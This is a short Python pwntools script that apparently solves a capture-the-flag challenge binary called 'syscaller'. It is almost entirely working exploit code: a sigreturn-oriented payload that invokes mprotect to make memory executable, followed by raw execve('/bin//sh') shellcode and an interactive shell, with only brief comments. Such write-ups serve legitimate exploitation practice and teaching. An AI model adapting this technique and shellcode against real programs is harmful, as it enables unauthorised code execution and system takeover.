from  pwn import *

gdbcmds = '''
	b *_start
	r
'''

context.arch = 'amd64'
elf = ELF('./syscaller')
target = process('./syscaller')
#target = gdb.debug('./syscaller', gdbscript=gdbcmds)

# call sigreturn
payload = b""
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0xf) # rax
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)

# call mprotect
frame = SigreturnFrame()
frame.rip = 0x00400104
frame.rax = 0xa  # syscall mprotect
frame.rdi = 0x400000 # start
frame.rsi = 0x1000 # size
frame.rdx = 0x7 # permissions
frame.rsp = 0x0040011a
payload += bytes(frame)

''' rip leads into a write syscall
    rsp will be the addr of the shellcode
    the write syscall will write the shellcode
    and rip will be pointing to it right after the syscall
'''


shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

print("Payload len", len(payload))
target.sendline(payload)
target.sendline(shellcode)
target.interactive()
